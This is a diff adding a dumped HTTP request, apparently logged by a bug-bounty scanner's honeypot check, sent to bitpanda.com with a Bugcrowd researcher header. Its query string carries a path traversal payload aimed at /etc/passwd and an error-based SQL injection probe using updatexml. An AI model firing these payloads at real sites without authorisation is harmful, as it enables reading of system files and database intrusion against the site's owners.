@@ -1,0 +1,14 @@
+[honeypot-detect] Dumped HTTP request for https://bitpanda.com/?30rugxNo91H3eMIrN0EA2U4XCCp=../../../../../../../../etc/passwd&30rugxNo91H3eMIrN0EA2U4XCCp=1%20and%20updatexml(1,concat(0x7e,(select%20md5(16119))),1)
+
+
+GET /?30rugxNo91H3eMIrN0EA2U4XCCp=../../../../../../../../etc/passwd&30rugxNo91H3eMIrN0EA2U4XCCp=1%20and%20updatexml(1,concat(0x7e,(select%20md5(16119))),1) HTTP/1.1
+Host: bitpanda.com
+User-Agent: Mozilla/5.0 (ZZ; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Connection: close
+Accept: */*
+Accept-Language: en
+Cookie: _cfuvid=MsGtQ4NpcGv5DNmtfWHDZvsgWIP5rn9s6gInAnRN_VQ-1754398232837-0.0.1.1-604800000; _cfuvid=lumOQ.Uv51IlHxY.sY6deeAVe8nwSPHbD8K_Wu0U.mk-1754398246985-0.0.1.1-604800000; _cfuvid=DArPluwOcA.DVXjJ4LhNQMYmS1yDA1UNin2l1kGRO78-1754398261840-0.0.1.1-604800000
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
